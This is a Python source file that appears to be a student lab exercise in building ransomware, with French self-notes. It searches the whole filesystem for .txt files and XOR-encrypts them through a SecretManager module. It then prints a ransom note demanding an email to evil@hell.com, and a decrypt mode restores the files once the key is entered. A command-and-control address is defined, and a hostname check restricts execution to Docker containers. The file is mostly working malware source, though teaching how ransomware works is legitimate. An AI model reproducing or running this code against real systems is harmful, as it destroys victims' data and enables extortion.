import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

#MODIF SUR LA FONCTION (c'est surtout des notes à moi même)
    def get_files(self, filter:str)->list:
        files = [] #Créer une liste (vide) "files"
        for file in Path("/").rglob(filter): #Path(/) : dossier racine, c'est le C:\ de linux quoi
            #rglob va chercher tous les docs correspondant à "filter" (les .txt logiquement)
            files.append(str(file.resolve())) 
            #file.resolve clean le chemin (pas de aprticules inutiles)
            #str(---) transforme le chemin en chaine de carac et add a liste 
        return files
    #La fonction retourne la liste des fichiers trouvés avec leur chemin absolu (après clean quoi)

#MODIF SUR LA FONCTION
    def encrypt(self):
        # main function for encrypting (see PDF)
        #Creation de l'instance "secret"
        secret_manager = SecretManager()

        #Récupération des fichiers texte à traiter (avec un "*.txt")
        files = self.get_files("*.txt")

        #Génération des clés et stockage
        secret_manager.setup()

        #Vérification que la clé a bien été chargée (verif)
        print(f"Clé chargée?") 
        # Chiffrement des fichiers avec la clé
        secret_manager.xorfiles(files) #Fonction Cipher Xor definie precedemment

        # Affichage du message de confirmation avec le token (en hexa)
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

#MODIF SUR LA FONCTION
    def decrypt(self):
        # main function for decrypting (see PDF)
        secret_manager = SecretManager()
        secret_manager.load()

        while True:
            key=input("Entrer la clé") #La clé est demandé
            try:
                secret_manager.set_key(key) # Verif
                files= self.get_files("*.txt")
                secret_manager.xorfiles(files) #Utilisation de la fct déchiffrement
                secret_manager.clean() #Appel de MrPropre pour nettoyer (on est sympa)
                print("Tout c'est bien passé")
                break # On sort du Ransomware
            
            #Si echec :
            except Exception:
                print("Clé incorrecte")
            #Et la boucle recommence dans ce cas
                
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()